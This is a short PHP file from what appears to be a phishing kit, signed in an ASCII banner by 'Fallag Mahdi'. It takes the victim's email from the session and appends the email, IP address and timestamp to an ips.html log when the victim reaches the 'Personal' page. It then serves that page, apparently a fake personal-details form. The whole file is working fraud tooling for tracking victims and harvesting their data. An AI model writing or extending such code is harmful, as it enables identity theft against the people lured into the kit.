<?php
#####################################################################################################
###################################### fallagmahdi@hotmail.com ######################################
###### ####### ##      ##      #######  #######       #### #### ####### ##     ##   ######   ########
##     ##   ## ##      ##      ##   ## ##             ## ### ## ##   ## ##     ##   ##    ##    ##
###### ####### ##      ##      ####### ##  ######     ##  #  ## ####### #########   ##     ##   ##
##     ##   ## ##      ##      ##   ## ##    ##       ##     ## ##   ## ##     ##   ##    ##    ##
##     ##   ## ####### ####### ##   ##  #######       ##     ## ##   ## ##     ##   ######   ########
############################## https://www.facebook.com/fallag.mahdi.tn #############################
#####################################################################################################
session_start();
include("inc/config.php");
$rand = @$_GET['dispatch'];
$email = $_SESSION['email'];
date_default_timezone_set("Africa/Tunis");
$date = date('d/m/Y', time());
$time = date('H:i:s', time());
$ip = getenv("REMOTE_ADDR");
$msg = "<b>$email </b> with <b>$ip</b> has cammed to <b>Personal</b> at <b>$time - $date</b><br>";
$myFile = "../ips.html";
$fh = fopen($myFile, 'a+') or die("can't open file");
fwrite($fh, $msg);
fclose($fh);
$css = css_perso();
$js = js_perso();
$html = html_perso($css, $js);
die($html);
?>
